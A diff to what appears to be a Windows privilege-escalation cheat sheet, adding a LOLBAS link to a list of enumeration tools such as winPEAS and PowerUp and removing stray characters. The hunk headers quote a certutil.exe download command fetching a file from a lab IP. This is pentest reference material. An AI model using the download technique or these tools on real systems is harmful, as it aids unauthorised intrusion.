@@ -355,6 +355,7 @@ certutil.exe -urlcache -f http://10.10.10.4/file.txt file.txt
       ```
     
 - **Automated**
+  - [LOLBAS](https://lolbas-project.github.io/)    
   - [PowerSploit's Power Up](https://github.com/PowerShellMafia/PowerSploit)
   - [Watson](https://github.com/rasta-mouse/Watson)
   - [Sherlock](https://github.com/rasta-mouse/Sherlock)
@@ -369,4 +370,3 @@ certutil.exe -urlcache -f http://10.10.10.4/file.txt file.txt
   - [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
   - [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
   - [Privesc Check](https://github.com/itm4n/PrivescCheck)
-đđđđ
